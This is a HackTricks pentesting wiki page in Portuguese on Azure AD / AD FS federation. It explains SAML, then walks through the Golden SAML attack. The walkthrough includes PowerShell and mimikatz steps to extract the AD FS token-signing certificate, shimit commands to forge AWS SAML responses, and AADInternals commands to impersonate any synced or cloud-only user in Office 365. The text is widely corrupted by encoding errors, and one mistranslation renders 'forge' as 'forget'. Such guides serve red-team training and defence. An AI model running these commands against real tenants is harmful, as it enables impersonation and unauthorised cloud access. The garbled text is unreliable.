# Az - Federation

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-fed)**A Federa√ß√£o** √© uma cole√ß√£o de **dom√≠nios** que estabeleceram **confian√ßa**. O n√≠vel de confian√ßa pode variar, mas normalmente inclui **autentica√ß√£o** e quase sempre inclui **autoriza√ß√£o**. Uma federa√ß√£o t√≠pica pode incluir um **n√∫mero de organiza√ß√µes** que estabeleceram **confian√ßa** para **acesso compartilhado** a um conjunto de recursos.

Voc√™ pode **federar seu ambiente on-premises** **com o Azure AD** e usar essa federa√ß√£o para autentica√ß√£o e autoriza√ß√£o. Este m√©todo de login garante que toda a **autentica√ß√£o do usu√°rio ocorra on-premises**. Este m√©todo permite que os administradores implementem n√≠veis de controle de acesso mais rigorosos. A federa√ß√£o com **AD FS** e PingFederate est√° dispon√≠vel.

<figure><img src="../../../../.gitbook/assets/image (154).png" alt=""><figcaption></figcaption></figure>

Basicamente, na Federa√ß√£o, toda a **autentica√ß√£o** ocorre no ambiente **on-prem** e o usu√°rio experimenta SSO em todos os ambientes confi√°veis. Portanto, os usu√°rios podem **acessar** aplica√ß√µes **na nuvem** usando suas **credenciais on-prem**.

**Security Assertion Markup Language (SAML)** √© usado para **trocar** todas as informa√ß√µes de autentica√ß√£o e autoriza√ß√£o entre os provedores.

Em qualquer configura√ß√£o de federa√ß√£o, existem tr√™s partes:

* Usu√°rio ou Cliente
* Provedor de Identidade (IdP)
* Provedor de Servi√ßo (SP)

(Images from https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

<figure><img src="../../../../.gitbook/assets/image (121).png" alt=""><figcaption></figcaption></figure>

1. Inicialmente, um aplicativo (Provedor de Servi√ßo ou SP, como o console AWS ou o cliente web vSphere) √© acessado por um usu√°rio. Esta etapa pode ser ignorada, levando o cliente diretamente ao IdP (Provedor de Identidade) dependendo da implementa√ß√£o espec√≠fica.
2. Em seguida, o SP identifica o IdP apropriado (por exemplo, AD FS, Okta) para autentica√ß√£o do usu√°rio. Ele ent√£o cria um AuthnRequest SAML (Security Assertion Markup Language) e redireciona o cliente para o IdP escolhido.
3. O IdP assume, autenticando o usu√°rio. Ap√≥s a autentica√ß√£o, uma SAMLResponse √© formulada pelo IdP e encaminhada ao SP atrav√©s do usu√°rio.
4. Finalmente, o SP avalia a SAMLResponse. Se validada com sucesso, implicando uma rela√ß√£o de confian√ßa com o IdP, o usu√°rio recebe acesso. Isso marca a conclus√£o do processo de login, permitindo que o usu√°rio utilize o servi√ßo.

**Se voc√™ quiser aprender mais sobre autentica√ß√£o SAML e ataques comuns, v√° para:**

{% embed url="https://book.hacktricks.xyz/pentesting-web/saml-attacks" %}

## Pivoting

* AD FS √© um modelo de identidade baseado em declara√ß√µes.
* "..as declara√ß√µes s√£o simplesmente afirma√ß√µes (por exemplo, nome, identidade, grupo), feitas sobre usu√°rios, que s√£o usadas principalmente para autorizar o acesso a aplicativos baseados em declara√ß√µes localizados em qualquer lugar da Internet."
* As declara√ß√µes para um usu√°rio s√£o escritas dentro dos tokens SAML e, em seguida, s√£o assinadas para fornecer confidencialidade pelo IdP.
* Um usu√°rio √© identificado pelo ImmutableID. √â globalmente √∫nico e armazenado no Azure AD.
* O ImmutableID √© armazenado on-premises como ms-DS-ConsistencyGuid para o usu√°rio e/ou pode ser derivado do GUID do usu√°rio.
* Mais informa√ß√µes em [https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims](https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/technical-reference/the-role-of-claims)

**Ataque Golden SAML:**

* No ADFS, a SAML Response √© assinada por um certificado de assinatura de token.
* Se o certificado for comprometido, √© poss√≠vel autenticar no Azure AD como QUALQUER usu√°rio sincronizado com o Azure AD!
* Assim como nosso abuso de PTA, a mudan√ßa de senha para um usu√°rio ou MFA n√£o ter√° efeito porque estamos forjando a resposta de autentica√ß√£o.
* O certificado pode ser extra√≠do do servidor AD FS com privil√©gios de DA e, em seguida, pode ser usado de qualquer m√°quina conectada √† Internet.
* Mais informa√ß√µes em [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

### Golden SAML

O processo onde um **Provedor de Identidade (IdP)** produz uma **SAMLResponse** para autorizar o login do usu√°rio √© fundamental. Dependendo da implementa√ß√£o espec√≠fica do IdP, a **resposta** pode ser **assinada** ou **criptografada** usando a **chave privada do IdP**. Este procedimento permite que o **Provedor de Servi√ßo (SP)** confirme a autenticidade da SAMLResponse, garantindo que foi realmente emitida por um IdP confi√°vel.

Um paralelo pode ser tra√ßado com o [ataque de golden ticket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket), onde a chave que autentica a identidade e permiss√µes do usu√°rio (KRBTGT para tickets dourados, chave privada de assinatura de token para golden SAML) pode ser manipulada para **forjar um objeto de autentica√ß√£o** (TGT ou SAMLResponse). Isso permite a impersonifica√ß√£o de qualquer usu√°rio, concedendo acesso n√£o autorizado ao SP.

Golden SAMLs oferecem certas vantagens:

* Podem ser **criados remotamente**, sem a necessidade de fazer parte do dom√≠nio ou federa√ß√£o em quest√£o.
* Permanecem eficazes mesmo com **Autentica√ß√£o de Dois Fatores (2FA)** habilitada.
* A chave privada de assinatura de token **n√£o se renova automaticamente**.
* **Mudar a senha de um usu√°rio n√£o invalida** um SAML j√° gerado.

#### AWS + AD FS + Golden SAML

[Active Directory Federation Services (AD FS)](https://docs.microsoft.com/en-us/previous-versions/windows/server-2008/bb897402\(v=msdn.10\)) √© um servi√ßo da Microsoft que facilita a **troca segura de informa√ß√µes de identidade** entre parceiros de neg√≥cios confi√°veis (federa√ß√£o). Ele essencialmente permite que um servi√ßo de dom√≠nio compartilhe identidades de usu√°rios com outros provedores de servi√ßo dentro de uma federa√ß√£o.

Com a AWS confiando no dom√≠nio comprometido (em uma federa√ß√£o), essa vulnerabilidade pode ser explorada para potencialmente **adquirir quaisquer permiss√µes no ambiente AWS**. O ataque requer a **chave privada usada para assinar os objetos SAML**, semelhante √† necessidade do KRBTGT em um ataque de golden ticket. O acesso √† conta de usu√°rio do AD FS √© suficiente para obter essa chave privada.

Os requisitos para executar um ataque golden SAML incluem:

* **Chave privada de assinatura de token**
* **Certificado p√∫blico do IdP**
* **Nome do IdP**
* **Nome do papel (papel a assumir)**
* Dom√≠nio\username
* Nome da sess√£o de papel na AWS
* ID da conta Amazon

_ Apenas os itens em negrito s√£o obrigat√≥rios. Os outros podem ser preenchidos conforme desejado._

Para adquirir a **chave privada**, o acesso √† **conta de usu√°rio do AD FS** √© necess√°rio. A partir da√≠, a chave privada pode ser **exportada do armazenamento pessoal** usando ferramentas como [mimikatz](https://github.com/gentilkiwi/mimikatz). Para coletar as outras informa√ß√µes necess√°rias, voc√™ pode utilizar o snapin Microsoft.Adfs.Powershell da seguinte forma, garantindo que voc√™ esteja logado como o usu√°rio ADFS:
```powershell
# From an "AD FS" session
# After having exported the key with mimikatz

# ADFS Public Certificate
[System.Convert]::ToBase64String($cer.rawdata)

# IdP Name
(Get-ADFSProperties).Identifier.AbsoluteUri

# Role Name
(Get-ADFSRelyingPartyTrust).IssuanceTransformRule
```
Com todas as informa√ß√µes, √© poss√≠vel esquecer uma SAMLResponse v√°lida como o usu√°rio que voc√™ deseja se passar usando [**shimit**](https://github.com/cyberark/shimit)**:**

{% code overflow="wrap" %}
```bash
# Apply session for AWS cli
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012
# idp - Identity Provider URL e.g. http://server.domain.com/adfs/services/trust
# pk - Private key file full path (pem format)
# c - Certificate file full path (pem format)
# u - User and domain name e.g. domain\username (use \ or quotes in *nix)
# n - Session name in AWS
# r - Desired roles in AWS. Supports Multiple roles, the first one specified will be assumed.
# id - AWS account id e.g. 123456789012

# Save SAMLResponse to file
python .\shimit.py -idp http://adfs.lab.local/adfs/services/trust -pk key_file -c cert_file -u domain\admin -n admin@domain.com -r ADFS-admin -r ADFS-monitor -id 123456789012 -o saml_response.xml
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (128).png" alt=""><figcaption></figcaption></figure>

### On-prem -> nuvem
```powershell
# With a domain user you can get the ImmutableID of the target user
[System.Convert]::ToBase64String((Get-ADUser -Identity <username> | select -ExpandProperty ObjectGUID).tobytearray())

# On AD FS server execute as administrator
Get-AdfsProperties | select identifier

# When setting up the AD FS using Azure AD Connect, there is a difference between IssueURI on ADFS server and Azure AD.
# You need to use the one from AzureAD.
# Therefore, check the IssuerURI from Azure AD too (Use MSOL module and need GA privs)
Get-MsolDomainFederationSettings -DomainName deffin.com | select IssuerUri

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate a user to to access cloud apps
Open-AADIntOffice365Portal -ImmutableID v1pOC7Pz8kaT6JWtThJKRQ== -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Documents\ADFSSigningCertificate.pfx -Verbose
```
Tamb√©m √© poss√≠vel criar ImmutableID de usu√°rios apenas na nuvem e se passar por eles.
```powershell
# Create a realistic ImmutableID and set it for a cloud only user
[System.Convert]::ToBase64String((New-Guid).tobytearray())
Set-AADIntAzureADObject -CloudAnchor "User_19e466c5-d938-1293-5967-c39488bca87e" -SourceAnchor "aodilmsic30fugCUgHxsnK=="

# Extract the ADFS token signing certificate from the ADFS server using AADInternals
Export-AADIntADFSSigningCertificate

# Impersonate the user
Open-AADIntOffice365Portal -ImmutableID "aodilmsic30fugCUgHxsnK==" -Issuer http://deffin.com/adfs/services/trust -PfxFileName C:\users\adfsadmin\Desktop\ADFSSigningCertificate.pfx -Verbose
```
## Refer√™ncias

* [https://learn.microsoft.com/pt-br/azure/active-directory/hybrid/whatis-fed](https://learn.microsoft.com/pt-br/azure/active-directory/hybrid/whatis-fed)
* [https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps](https://www.cyberark.com/resources/threat-research-blog/golden-saml-newly-discovered-attack-technique-forges-authentication-to-cloud-apps)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
